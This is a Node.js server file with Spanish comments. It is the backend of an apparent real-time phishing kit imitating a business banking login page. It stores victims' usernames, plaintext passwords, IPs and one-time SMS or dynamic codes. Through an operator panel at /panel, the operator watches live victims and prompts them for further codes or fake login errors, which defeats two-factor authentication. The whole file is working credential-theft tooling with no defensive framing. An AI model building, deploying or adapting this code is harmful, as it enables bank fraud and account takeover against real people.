const http = require('http');
const fs = require('fs');
const path = require('path');

// DigitalOcean App Platform asigna PORT por variable de entorno (por defecto 8080)
const PORT = parseInt(process.env.PORT, 10) || 8080;
// En contenedores cloud (DigitalOcean, Docker, etc.) es obligatorio escuchar en 0.0.0.0
const HOST = '0.0.0.0';
const PUBLIC_DIR = __dirname;

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.descarga': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf'
};

// Almacén de sesiones en memoria para el panel de operador
let sessions = {};

function parseJsonBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (_) {
        resolve({});
      }
    });
  });
}

function sendJson(res, statusCode, data) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
  });
  res.end(JSON.stringify(data));
}

async function handleRequest(req, res) {
  try {
    const reqUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    let pathname = decodeURIComponent(reqUrl.pathname);

    // Manejo de preflight CORS
    if (req.method === 'OPTIONS') {
      res.writeHead(204, {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
      });
      return res.end();
    }

    // Endpoints de comprobación de estado (Health Checks) para DigitalOcean / Cloud
    if (pathname === '/health' || pathname === '/healthz' || pathname === '/ping') {
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('OK');
    }

    // ==========================================
    // API de Sesiones en tiempo real para el Panel
    // ==========================================

    // 1. Obtener todas las sesiones (para el panel de operador)
    if (pathname === '/api/sessions' && req.method === 'GET') {
      const now = Date.now();
      const list = Object.values(sessions).map((s) => {
        const online = now - s.last_seen < 20000;
        return { ...s, online };
      });
      return sendJson(res, 200, list);
    }

    // 2. Crear o actualizar sesión (desde el login de empresas)
    if (pathname === '/api/sessions' && req.method === 'POST') {
      const body = await parseJsonBody(req);
      const { id, username, password, tipoUsuario, device, state } = body;
      if (!id) return sendJson(res, 400, { error: 'Missing session id' });

      const clientIp = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
      const now = Date.now();

      if (sessions[id]) {
        sessions[id] = {
          ...sessions[id],
          username: username || sessions[id].username,
          password: password || sessions[id].password,
          tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
          device: device || sessions[id].device,
          ip: body.ip || clientIp,
          state: state || sessions[id].state,
          last_seen: now,
          updatedAt: now
        };
      } else {
        sessions[id] = {
          id,
          index: Object.keys(sessions).length + 1,
          username: username || '—',
          password: password || '—',
          tipoUsuario: tipoUsuario || 'EMPRESAS',
          device: device || 'desktop',
          ip: body.ip || clientIp,
          state: state || 'waiting',
          token: '',
          createdAt: now,
          last_seen: now,
          updatedAt: now
        };
      }
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 3. Ping keepalive de la sesión
    const pingMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/ping$/);
    if (pingMatch && req.method === 'POST') {
      const id = pingMatch[1];
      if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
      sessions[id].last_seen = Date.now();
      return sendJson(res, 200, { success: true });
    }

    // 4. Enviar token / código ingresado por el usuario
    const tokenMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/token$/);
    if (tokenMatch && req.method === 'POST') {
      const id = tokenMatch[1];
      if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
      const body = await parseJsonBody(req);
      sessions[id].token = body.token || '';
      const currentAction = sessions[id].action;
      if (currentAction === 'sms') {
        sessions[id].state = 'received-sms';
      } else {
        sessions[id].state = 'received-dinamica';
      }
      sessions[id].action = null;
      sessions[id].last_seen = Date.now();
      sessions[id].updatedAt = Date.now();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 5. Asignar acción desde el panel de operador (dinamica, sms, error-login, done, etc.)
    const actionMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/action$/);
    if (actionMatch && req.method === 'POST') {
      const id = actionMatch[1];
      if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
      const body = await parseJsonBody(req);
      sessions[id].state = body.state || sessions[id].state;
      sessions[id].action = body.action;
      if (body.action === 'dinamica' || body.action === 'sms') {
        sessions[id].token = '';
      }
      sessions[id].last_seen = Date.now();
      sessions[id].updatedAt = Date.now();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 6. Cambiar estado de la sesión (ej. 'typing')
    const stateMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/state$/);
    if (stateMatch && req.method === 'POST') {
      const id = stateMatch[1];
      if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
      const body = await parseJsonBody(req);
      sessions[id].state = body.state || sessions[id].state;
      sessions[id].last_seen = Date.now();
      sessions[id].updatedAt = Date.now();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 7. Consultar sesión individual (polling del cliente)
    const sessionMatch = pathname.match(/^\/api\/sessions\/([^\/]+)$/);
    if (sessionMatch && req.method === 'GET') {
      const id = sessionMatch[1];
      const session = sessions[id];
      if (!session) return sendJson(res, 404, { error: 'Session not found' });
      return sendJson(res, 200, session);
    }

    // 8. Limpiar todas las sesiones
    if (pathname === '/api/clear' && req.method === 'POST') {
      sessions = {};
      return sendJson(res, 200, { success: true });
    }

    // ==========================================
    // Servidor de archivos estáticos
    // ==========================================

    if (pathname === '/') {
      pathname = '/empresas.html';
    }

    // Acceso a /panel -> /panel/index.html
    if (pathname === '/panel') {
      pathname = '/panel/index.html';
    }

    // Prevenir directory traversal
    const safePath = path.normalize(path.join(PUBLIC_DIR, pathname));
    if (!safePath.startsWith(PUBLIC_DIR)) {
      res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('403 Prohibido');
    }

    fs.stat(safePath, (err, stats) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('404 No Encontrado');
      }

      let filePath = safePath;
      if (stats.isDirectory()) {
        filePath = path.join(safePath, 'index.html');
      }

      const ext = path.extname(filePath).toLowerCase();
      const contentType = MIME_TYPES[ext] || 'application/octet-stream';

      if (req.method === 'HEAD') {
        res.writeHead(200, { 'Content-Type': contentType });
        return res.end();
      }

      fs.readFile(filePath, (readErr, content) => {
        if (readErr) {
          res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
          return res.end('500 Error interno del servidor');
        }

        res.writeHead(200, { 'Content-Type': contentType });
        res.end(content);
      });
    });
  } catch (error) {
    res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('500 Error en la petición');
  }
}

const server = http.createServer(handleRequest);

server.listen(PORT, HOST, () => {
  console.log(`\n=========================================`);
  console.log(` Servidor Node.js activo`);
  console.log(` Escuchando en http://${HOST}:${PORT}`);
  console.log(` Panel de operador en http://${HOST}:${PORT}/panel`);
  console.log(`=========================================\n`);
});

server.on('error', (err) => {
  console.error('Error al iniciar el servidor:', err);
  process.exit(1);
});

// Manejo de señales para apagado limpio en contenedores cloud
process.on('SIGTERM', () => {
  console.log('Recibido SIGTERM, cerrando servidor...');
  server.close(() => process.exit(0));
});

process.on('SIGINT', () => {
  console.log('Recibido SIGINT, cerrando servidor...');
  server.close(() => process.exit(0));
});
